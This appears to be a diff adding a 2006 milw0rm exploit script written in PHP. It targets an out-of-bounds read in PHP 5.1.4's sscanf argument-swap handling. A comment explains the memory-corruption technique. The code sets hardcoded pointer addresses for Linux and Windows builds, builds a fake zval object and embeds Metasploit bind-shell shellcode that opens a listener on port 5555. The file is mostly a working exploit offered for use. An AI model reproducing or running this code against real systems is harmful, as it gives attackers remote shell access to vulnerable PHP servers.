@@ -1,0 +1,118 @@
+<?php
+
+/*
+
+  Author: Heintz
+  Date: 4-th august 2006
+  Greets:
+  Waraxe from www.waraxe.us
+  All buds at www.plain-text.info
+  Torufoorum
+
+  ext/standard/scanf.c line ~887
+  ---
+  if (numVars) {
+                    current = args[objIndex++];
+  ---
+
+  objIndex points past the end of array in other format cases too
+
+  when php-s sscanf-s format argument contains argument swap
+  and extra arguments are given like.
+  sscanf('foo ','$1s',$bar) then it reads an pointer to pointer to
+  zval structure past the end of argument array by one.
+
+  This exploit first fills php internally cached memory with address of pointer
+  to writable segment. Then by unsetting the variable it frees memory, but does not
+  zero it, so this way we pass our own pointers to sscanf.
+
+  Now sscanf allocated array has valid element one past the array,
+  sscanf tries to call a function to destruct zval structure.
+  if its 15-th byte isnt anything valid it will default to doing nothing
+  and will continue without errors and returns;
+
+  sscanf now sets the structure to be of type string and writes
+  pointer to string  (it matched from our first argument to sscanf) and strings
+  length to a structure-s value union. the strings address is written to first 4 bytes
+  of structure.
+
+  knowing this we construct our own binary zval structure of type object. + shellcode + space
+  to match format. So now we have successfully called sscanf for the first time
+  and we got something like ptrptr->ptr->zval-of-type-string in memory
+  zval-of-type-string first 4 bytes point to our object we passed as argument.
+
+  so now we fill the internal cached memory with just pointer to zval. and free it.
+  when sscanf reads the pointer this time it now moves upwards one level but still
+  dereferences twice. thus acts upon our zval structure of type object.
+  when the destructor function now sees the zval is an object it will read
+  a pointer from our structure to another structure which supposed to contain function
+  pointers. it will call whatever the 2-cond element points to. all elements are 4 bytes long
+  thus address pointed to by structures offset 4 is called.
+  when we give it our ptr-to-zval - 4
+  it will add 4 bytes to it and dereference it an call whatever is there. and
+  there is address to our constructed zval object so we are executing code
+  from the beginning of our structure. eip-hop-over will help us through
+  unwanted bytes and we are on our way executing our shellcode.
+
+*/
+
+
+// tested addresses from php5ts.dll (php 5.1.4) running win x64 pro
+// $ptr_to_ptr_to_zval = "\x10\x43\x54\xCC";
+// $ptr_to_zval = "\x10\x43\x54\xB0";
+// $ptr_to_obj_handlers = "\x10\x43\x54\xAC"; // $ptr_to_zval-4
+
+
+// addresses from php 5.1.4 cli, compiled with gcc version 3.3.6,
+// kernel 2.6.14-hardened-r3
+$ptr_to_ptr_to_zval = "\x08\x1A\x64\xC8";
+$ptr_to_zval = "\x08\x1A\x60\x0C";
+$ptr_to_obj_handlers = "\x08\x1A\x60\x08"; // $ptr_to_zval-4
+// nop, nop, nop, mov eax,nex-4-bytes. to disarm 4 next bytes
+$eip_hop_over = "\x90\x90\x90\xB8";
+
+# linux_ia32_bind -  LPORT=5555 Size=108 Encoder=PexFnstenvSub http://metasploit.com
+$shellcode =
+"\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xef".
+"\x57\xe6\x92\x83\xeb\xfc\xe2\xf4\xde\x8c\xb5\xd1\xbc\x3d\xe4\xf8".
+"\x89\x0f\x7f\x1b\x0e\x9a\x66\x04\xac\x05\x80\xfa\xfa\xe4\x80\xc1".
+"\x66\xb6\x8c\xf4\xb7\x07\xb7\xc4\x66\xb6\x2b\x12\x5f\x31\x37\x71".
+"\x22\xd7\xb4\xc0\xb9\x14\x6f\x73\x5f\x31\x2b\x12\x7c\x3d\xe4\xcb".
+"\x5f\x68\x2b\x12\xa6\x2e\x1f\x22\xe4\x05\x8e\xbd\xc0\x24\x8e\xfa".
+"\xc0\x35\x8f\xfc\x66\xb4\xb4\xc1\x66\xb6\x2b\x12";
+
+if(bin2hex(pack('S',0x0010))!="0010")
+{	// small endian conversion
+	$t = $ptr_to_ptr_to_zval;
+	$ptr_to_ptr_to_zval = $t{3}.$t{2}.$t{1}.$t{0};
+
+	$t = $ptr_to_zval;
+	$ptr_to_zval = $t{3}.$t{2}.$t{1}.$t{0};
+
+	$t = $ptr_to_obj_handlers;
+	$ptr_to_obj_handlers = $t{3}.$t{2}.$t{1}.$t{0};
+}
+
+$object_zval = $eip_hop_over.$ptr_to_obj_handlers.$eip_hop_over.
+               "\x05\x01\x90\x90".$shellcode."\xC3\x90\x90\x20";
+
+$str = str_repeat($ptr_to_ptr_to_zval,20);
+unset($str);
+
+sscanf(
+$object_zval,
+'%1$s',
+$str);
+
+putenv("PHP_foo=".str_repeat($ptr_to_zval,64));
+putenv("PHP_foo=");
+
+sscanf(
+"a ",
+'%1$s',
+$str);
+
+
+?>
+
+# milw0rm.com [2006-08-08]
